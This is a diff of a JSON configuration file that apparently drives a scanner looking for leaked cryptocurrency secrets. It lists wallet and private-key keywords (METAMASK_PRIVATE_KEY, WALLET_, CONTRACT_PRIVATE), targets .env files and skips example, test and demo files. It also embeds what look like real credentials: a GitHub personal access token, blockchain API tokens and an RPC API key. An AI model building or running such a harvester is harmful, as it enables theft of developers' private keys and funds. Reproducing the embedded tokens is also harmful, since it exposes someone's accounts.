@@ -1,45 +1,37 @@
 {
-    "apis":  {
-        "git": {
-            "token": "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"
-        },
-        "eth": {
-            "token": "HK6YW5ECMU76VX26RXWDZQWJC4A7KAIZT3"
-        },
-        "bnb": {
-            "token": "VGB9QT3Y3K6F7TRID3UM6Z255WNDDGMDCR"
-        }
+  "apis": {
+    "solana": {
+      "rpc": "https://mainnet.helius-rpc.com/?api-key=5304e9c1-1453-483b-a656-2c7fd42bd92e"
     },
+    "git": {
+      "token": "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"
+    },
+    "eth": {
+      "token": "HK6YW5ECMU76VX26RXWDZQWJC4A7KAIZT3"
+    },
+    "bnb": {
+      "token": "VGB9QT3Y3K6F7TRID3UM6Z255WNDDGMDCR"
+    }
+  },
 
-   "words": [
-        "SOLANA",
-        "COIN"
-    ],
-    "words__": [
-      "_PUBLIC_KEY=0x",
-      "METAMASK_",
-      "METAMASK_KEY",
-      "METAMASK_PRIVATE",
-      "METAMASK_PRIVATE_KEY",
-      "TRUST_",
-      "BNB_",
-      "NFT",
-      "BITCOIN",
-      "BTC",
-      "CRYPTO",
-      "PRIVATE_ADDRESS",
-      "COIN",
-      "WALLET_",
-      "CONTRACT_PRIVATE"
-    ],
-    "extensions": [
-        "env"
-    ],
-    "skipFilenames":  [
-        "example",
-        "local",
-        "test",
-        "demo",
-        "dev"
-    ]
+  "words": ["SOLANA", "COIN"],
+  "words__": [
+    "_PUBLIC_KEY=0x",
+    "METAMASK_",
+    "METAMASK_KEY",
+    "METAMASK_PRIVATE",
+    "METAMASK_PRIVATE_KEY",
+    "TRUST_",
+    "BNB_",
+    "NFT",
+    "BITCOIN",
+    "BTC",
+    "CRYPTO",
+    "PRIVATE_ADDRESS",
+    "COIN",
+    "WALLET_",
+    "CONTRACT_PRIVATE"
+  ],
+  "extensions": ["env"],
+  "skipFilenames": ["example", "local", "test", "demo", "dev"]
 }
